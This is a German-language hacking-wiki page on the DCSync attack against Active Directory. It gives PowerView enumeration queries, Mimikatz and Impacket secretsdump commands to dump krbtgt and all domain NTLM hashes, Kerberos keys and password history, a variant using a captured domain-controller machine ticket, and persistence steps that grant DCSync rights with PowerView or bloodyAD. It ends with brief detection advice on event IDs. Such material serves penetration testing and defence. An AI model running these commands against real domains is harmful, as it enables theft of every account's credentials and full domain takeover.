# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-Berechtigung setzt voraus, dass die folgenden Berechtigungen für die Domäne selbst vorhanden sind: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controller auf, Informationen zu replizieren**. Dazu wird das Directory Replication Service Remote Protocol (MS-DRSR) verwendet. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht abgeschaltet oder deaktiviert werden.
- Standardmäßig verfügen nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** über die erforderlichen Berechtigungen.
- In der Praxis benötigt **vollständiges DCSync** **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** für den Domänen-Namenskontext. `DS-Replication-Get-Changes-In-Filtered-Set` wird häufig zusammen mit diesen Berechtigungen delegiert, ist für sich genommen jedoch eher für die Synchronisierung von **vertraulichen / RODC-gefilterten Attributen** (z. B. Secrets im älteren LAPS-Stil) relevant als für einen vollständigen krbtgt-Dump.<sup>[[2]](#references)</sup>
- Wenn Passwörter von Konten mit reversibler Verschlüsselung gespeichert werden, kann Mimikatz das Passwort im Klartext ausgeben.

### Aufzählung

Prüfe mit `powerview`, wer über diese Berechtigungen verfügt:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Wenn du dich auf **nicht standardmäßige Principals** mit DCSync-Rechten konzentrieren möchtest, filtere die integrierten replizierungsfähigen Gruppen heraus und überprüfe nur unerwartete Berechtigungsempfänger:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit lokal

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Remote Exploit

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktische Beispiele mit eingegrenztem Umfang:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync mit einem erbeuteten DC-Machine-TGT (ccache)

Wenn du einen Dienst auf einem Domain Controller untersuchst, unterscheide seine lokale Dienstidentität von seiner Netzwerkidentität. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), dass SQL Server-Virtualkonten (`NT SERVICE\...`) auf Netzwerkressourcen als Computerkonto des Hosts zugreifen. Auf einem Domain Controller kann dadurch das DC-Computerkonto für die Überprüfung von Replikationsrechten relevant sein. Ein Zugriff auf einen Dienst allein belegt jedoch weder, dass ein exportierbares Machine-TGT vorliegt, noch, dass eine verwendbare DCSync-Authentifizierung möglich ist. Überprüfe die tatsächliche Dienstidentität, den ausgehenden Authentifizierungskontext, verfügbare Tickets oder Zugangsdaten sowie die effektiven Replikationsrechte, bevor du dies als Angriffsweg einstufst.

In Szenarien mit unconstrained delegation im Export-Modus kannst du ein Machine-TGT eines Domain Controllers abfangen (z. B. `DC1$@DOMAIN` für `krbtgt@DOMAIN`). Anschließend kannst du dieses ccache verwenden, um dich als DC zu authentifizieren und DCSync ohne Passwort durchzuführen.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Betriebshinweise:

- **Impackets Kerberos-Pfad greift vor dem DRSUAPI-Aufruf zuerst auf SMB zu.** Wenn die Umgebung die **SPN-Zielnamenvalidierung** erzwingt, kann ein vollständiger Dump fehlschlagen: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Fordere in diesem Fall entweder zuerst ein Service-Ticket für **`cifs/<dc>`** des Ziel-DCs an oder verwende für das Konto, das du sofort benötigst, **`-just-dc-user`**.
- Wenn du nur über geringere Replikationsrechte verfügst, kann eine Synchronisierung im LDAP-/DirSync-Stil trotzdem **vertrauliche** oder **RODC-gefilterte** Attribute offenlegen (zum Beispiel das veraltete `ms-Mcs-AdmPwd`), ohne dass eine vollständige krbtgt-Replikation nötig ist.<sup>[[2]](#references)</sup>

`-just-dc` erstellt 3 Dateien:

- eine mit den **NTLM-Hashes**
- eine mit den **Kerberos-Schlüsseln**
- eine mit Klartextpasswörtern aus der NTDS für alle Konten, bei denen [**reversible Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Benutzer mit aktivierter reversibler Verschlüsselung kannst du mit dem folgenden Befehl finden:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistenz

Wenn du Domänenadministrator bist, kannst du mithilfe von PowerView jedem beliebigen Benutzer diese Berechtigungen erteilen:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux-Operatoren können dasselbe mit `bloodyAD` tun:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Dann können Sie **überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden**, indem Sie in der Ausgabe nach ihnen suchen (die Namen der Berechtigungen sollten im Feld "ObjectType" sichtbar sein):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Gegenmaßnahmen

- Sicherheitsereignis-ID 4662 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Eine Operation wurde an einem Objekt durchgeführt<sup>[[4]](#references)</sup>
- Sicherheitsereignis-ID 5136 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
- Sicherheitsereignis-ID 4670 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Berechtigungen für ein Objekt wurden geändert
- AD ACL Scanner – ACL-Berichte erstellen und vergleichen. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket-Änderungsprotokoll](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replikation mit Get-Changes und Get-Changes-In-Filtered-Set nutzen](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Passwort-Hashes vom Domain Controller auslesen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL-Zugangsdaten → gezieltes Kerberoasting → uneingeschränkte Delegierung → DCSync zum DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
